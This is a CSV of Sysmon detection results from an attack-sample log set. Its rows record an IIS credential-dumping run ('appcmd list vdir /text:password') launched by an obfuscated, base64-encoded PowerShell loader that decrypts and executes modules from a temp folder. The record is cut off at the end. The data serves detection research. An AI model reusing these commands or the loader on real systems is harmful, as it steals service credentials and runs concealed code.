2019-05-27T01:29:19.063277+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5946,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 1508
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-0010A6B1FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:userName'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.023
"
2019-05-27T01:29:19.143393+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5949,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 2796
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-001066B5FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir /text:password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.103
"
2019-05-27T01:29:19.233522+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5952,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 1036
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-001026B9FF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Filename: redirection.config"" /text:userName'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.183
"
2019-05-27T01:29:19.323652+00:00,Hacktool - EDR-Freeze Execution;Microsoft IIS Service Account Password Dumped;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5955,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAKQB8AGkAZQB4ADsAUgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACAALQBGAG8AcgBjAGUAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA7AA=='
Product: Internet Information Services
Company: Microsoft Corporation
ParentProcessId: 2584
LogonGuid: 365ABB72-B26B-5CEA-0000-002023240800
Hashes: SHA1=C5423FEF0E8E211BB8BAB9C11E730048BBED7B29,MD5=0E5BC786206A3762CE47A0A2DBD01D7B,SHA256=113F68086A3F02276395CB70C72B00ED33A47FD00820D229093CD6ADDC2F73F4,IMPHASH=1697BBEAB0AC62DD7B8016CE25425F45
ParentProcessGuid: 365ABB72-3D4A-5CEB-0000-0010FA93FD00
ProcessId: 168
CurrentDirectory: C:\Windows\Temp\
ProcessGuid: 365ABB72-3D6F-5CEB-0000-00108FBFFF00
CommandLine: '""C:\Windows\System32\inetsrv\appcmd.exe""  list vdir ""Filename: redirection.config"" /text:password'
FileVersion: 7.5.7600.16385 (win7_rtm.090713-1255)
User: IIS APPPOOL\DefaultAppPool
LogonId: '0x82423'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-05-27 01:29:19.283
"
2019-05-27T01:29:19.403767+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/Credential Access/discovery_sysmon_1_iis_pwd_and_config_discovery_appcmd.evtx,1,Microsoft-Windows-Sysmon,1,5958,IEWIN7,"Image: C:\Windows\System32\inetsrv\appcmd.exe
RuleName: ''
Description: Application Server Command Line Admin Tool
TerminalSessionId: 0
ParentCommandLine: '""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""  -nop -noni -enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQAgAD0AIAAiAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIgA7ACQAcABhAHQAaABfAGkAbgBfAG0AbwBkAHUAbABlAD0AIgBDADoAXABXAGkAbgBkAG8AdwBzAFwAVABlAG0AcABcADYAagByAHgAawAzAFwAZwBmAGcAOQBpACIAOwAkAHAAYQB0AGgAXwBpAG4AXwBhAHAAcABfAGMAbwBkAGUAPQAiAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwANgBqAHIAeABrADMAXABuAGoAYQA5AHQANgA0AHIAcgBsAHUAOAAiADsAJABrAGUAeQA9AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAnADgAZAA5ADYAOQBlAGUAZgA2AGUAYwBhAGQAMwBjADIAOQBhADMAYQA2ADIAOQAyADgAMABlADYAOAA2AGMAZgAwAGMAMwBmADUAZAA1AGEAOAA2AGEAZgBmADMAYwBhADEAMgAwADIAMABjADkAMgAzAGEAZABjADYAYwA5ADIAJwApADsAJABlAG4AYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAkAHAAYQB0AGgAXwBpAG4AXwBtAG8AZAB1AGwAZQApADsAJABlAG4AYwBfAGEAcABwAF8AYwBvAGQAZQA9AFsAUwB5AHMAdABlAG0ALgBJAE8ALgBGAGkAbABlAF0AOgA6AFIAZQBhAGQAQQBsAGwAQgB5AHQAZQBzACgAJABwAGEAdABoAF8AaQBuAF8AYQBwAHAAXwBjAG8AZABlACkAOwAkAGQAZQBjAF8AbQBvAGQAdQBsAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AbQBvAGQAdQBsAGUALgBMAGUAbgBnAHQAaAA7ACQAZABlAGMAXwBhAHAAcABfAGMAbwBkAGUAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwBmAG8AcgAgACgAJABpACAAPQAgADAAOwAgACQAaQAgAC0AbAB0ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAA9ACAAJABlAG4AYwBfAG0AbwBkAHUAbABlAFsAJABpAF0AIAAtAGIAeABvAHIAIAAkAGsAZQB5AFsAJABpACAAJQAgACQAawBlAHkALgBMAGUAbgBnAHQAaABdADsAfQA7AGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAGUAbgBjAF8AYQBwAHAAXwBjAG8AZABlAC4ATABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQBbACQAaQBdACAAPQAgACQAZQBuAGMAXwBhAHAAcABfAGMAbwBkAGUAWwAkAGkAXQAgAC0AYgB4AG8AcgAgACQAawBlAHkAWwAkAGkAIAAlACAAJABrAGUAeQAuAEwAZQBuAGcAdABoAF0AOwB9ADsAJABkAGUAYwBfAG0AbwBkAHUAbABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAG0AbwBkAHUAbABlACkAOwAkAGQAZQBjAF8AYQBwAHAAXwBjAG8AZABlAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwBfAGEAcABwAF8AYwBvAGQAZQApADsAJAAoACQAZABlAGMAXwBtAG8AZAB1AGwAZQArACQAZABlAGMAXwBhAHA